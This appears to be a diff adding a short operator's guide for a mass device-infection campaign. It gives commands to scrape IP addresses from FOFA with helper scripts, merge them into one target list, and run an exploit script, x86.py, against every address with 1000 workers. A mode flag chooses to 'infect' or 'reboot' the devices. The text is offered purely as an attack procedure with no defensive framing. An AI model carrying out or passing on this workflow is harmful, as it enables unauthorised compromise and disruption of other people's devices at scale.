@@ -1,0 +1,17 @@
+mkdir geo;cd geo
+mkdir countrys
+cd countrys/
+
+
+put scrapecn.py & scrapeport.py in countrys
+
+scrape ips from fofa using: scrapecn.py (python3 scrapecn.py) or use scrapeport.py (python3 scrapeport.py)
+
+cat *.txt >> allscraped.list
+
+rm -rf *.txt
+
+mv allscraped.list /root/geo
+
+Now to run the exploit:
+python3 x86.py -f allscraped.list -w 1000 -o reboot/infect (use infect if looking to infect devices, reboot if you want reboot them)
